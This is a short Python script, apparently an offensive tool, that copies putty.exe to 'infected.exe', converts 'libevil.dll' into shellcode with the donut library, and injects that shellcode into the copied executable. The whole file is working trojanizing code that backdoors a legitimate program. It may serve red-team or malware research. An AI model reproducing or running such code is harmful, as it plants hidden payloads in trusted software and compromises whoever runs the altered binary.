import shutil
import donut
import inject


old_file_exe = "putty.exe"
file_exe = "infected.exe"
shutil.copy(old_file_exe, file_exe)

file_dll = "libevil.dll"
file_bin = "libevil.bin"
sc = donut.create(file = file_dll)
open(file_bin, "wb").write(sc)

inject.inject(file_exe, sc)
